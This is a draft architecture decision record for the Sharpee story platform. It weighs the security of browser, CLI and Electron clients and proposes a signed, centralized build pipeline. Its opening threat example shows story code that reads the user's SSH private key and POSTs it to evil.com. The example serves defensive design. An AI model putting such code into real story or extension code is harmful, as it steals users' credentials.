# ADR-112: Client Security Model

## Status: Draft (Research Needed)

## Context

Sharpee is a native JavaScript/TypeScript platform, not a VM-based system. This means stories and extensions execute with the full permissions of their runtime environment.

The security implications vary dramatically by client:

| Client | Runtime | Sandbox | Risk |
|--------|---------|---------|------|
| Browser | Browser JS engine | Yes - browser security model | Low |
| CLI | Node.js | None | **High** |
| Electron | Chromium + Node.js | Configurable | Variable |

### The Core Problem

A malicious **story** (not just extension) could include harmful code:

```typescript
export const story: Story = {
  initializeWorld(world) {
    // This executes with full Node.js permissions in CLI
    const secrets = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');
    require('https').request({ hostname: 'evil.com', path: '/steal', method: 'POST' },
      (res) => {}).end(secrets);
  }
};
```

In browser, this fails (no `require`, no filesystem). In CLI, it succeeds.

## Research Needed

### Browser Client
- Already sandboxed - document security guarantees
- CSP header recommendations
- Service worker risks?

### CLI Client
- Can we sandbox Node.js execution? (vm2, isolated-vm, containers)
- Performance implications of sandboxing
- What legitimate system access do games need?
- Warning/consent model for untrusted games
- Code signing / notarization for trusted authors

### Electron Client
- Secure configuration defaults (nodeIntegration, contextIsolation)
- Preload script patterns for safe API exposure
- Can we validate/audit Electron builds?
- Distribution risks (modified Electron builds)

### General
- Trust model for stories vs extensions
- How do other native game engines handle this? (Unity, Godot, Ren'Py)
- Legal/liability considerations

## Possible Mitigations

1. **Recommend browser for untrusted content** - Safest default
2. **Sandboxed CLI mode** - Docker/Firecracker/vm2
3. **Signed games** - Trusted author verification
4. **Capability declarations** - Engine-level enforcement (bypassable but raises bar)
5. **Static analysis** - Scan story code for dangerous patterns
6. **Warnings** - Clear user consent for CLI/Electron execution

## Proposed Approach: Centralized Build Server

For non-browser clients (CLI, Electron, screen-reader), require stories to be built through sharpee.net:

### Distribution Model by Client

| Client | Distribution | Validation |
|--------|--------------|------------|
| Browser (thin-web) | Author self-hosts | Browser sandbox protects users |
| CLI / Electron / Screen-reader | **Must go through sharpee.net** | Build server validates + signs |

### Build Pipeline Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      sharpee.net                             │
├─────────────────────────────────────────────────────────────┤
│  Author Portal                                               │
│  - Submit story source (GitHub link or upload)               │
│  - View build status, test results                           │
│  - Download signed builds                                    │
├─────────────────────────────────────────────────────────────┤
│  Build Pipeline (AWS)                                        │
│  1. Clone source into isolated container                     │
│  2. npm audit, dependency check                              │
│  3. Static analysis for dangerous patterns                   │
│  4. Build story                                              │
│  5. Run all tests + walkthroughs                             │
│  6. Build CLI/Electron packages                              │
│  7. Sign with HSM-protected key                              │
│  8. Publish to download page                                 │
└─────────────────────────────────────────────────────────────┘
```

### Code Signing Flow

```
Author submits source
        ↓
   Sharpee.NET validates (static analysis, npm audit)
        ↓
   AWS builds in isolated ephemeral container
        ↓
   Runs tests + walkthroughs (must pass)
        ↓
   Signs with Sharpee private key (HSM-protected)
        ↓
   Provides signed download
        ↓
   CLI/Electron VERIFIES signature before running
        ↓
   Invalid signature = refuses to run
```

### Client Signature Verification

```typescript
// CLI/Electron startup - MANDATORY
const signature = readSignature(gameBundle);
const valid = verifySignature(signature, SHARPEE_PUBLIC_KEY);

if (!valid) {
  console.error("This game is not signed by Sharpee.NET.");
  console.error("It may have been modified or come from an unofficial source.");
  console.error("Run with --allow-unsigned to bypass (AT YOUR OWN RISK)");
  process.exit(1);
}
```

### What This Protects Against

| Threat | Protection |
|--------|------------|
| Malicious source code | Validation, static analysis, tests must pass |
| Build-time injection | User cannot modify build process |
| Compromised dependencies | npm audit, locked deps, controlled env |
| Post-download modification | Signature verification rejects tampered builds |
| Unverified authors | Account + audit trail on sharpee.net |

### Remaining Attack Vectors

| Attack | Difficulty | Mitigation |
|--------|------------|------------|
| Compromise build server | Hard | Security hardening, HSM for keys, audit logs |
| Sophisticated obfuscation | Medium | Human review tier for certain clients |
| Time-bomb (passes tests, malicious later) | Medium | Runtime monitoring? Hard to catch |
| Social engineering (`--allow-unsigned`) | Easy | Education, scary warnings, maybe remove flag |
| Exploit in Electron renderer | Medium | Proper Electron security config |

### Key Requirements

1. **Signature verification is mandatory** - Without it, model falls apart
2. **Build server is isolated** - Ephemeral containers, no persistent state
3. **Signing key in HSM** - Not accessible to build process itself
4. **Reproducible builds** - Given same source, produces identical output (allows independent verification)

### Precedent

This model is used by:
- Apple App Store (iOS apps)
- Google Play (Android apps)
- Microsoft Store (signed Windows apps)
- Steam (game validation)

It doesn't make attacks impossible, but significantly raises the bar and creates accountability.

## Decision

Deferred pending research. Centralized build server is the leading candidate for non-browser clients.

## Related

- ADR-111: Extension Ecosystem (extension-specific security)
- This ADR covers story/client security more broadly
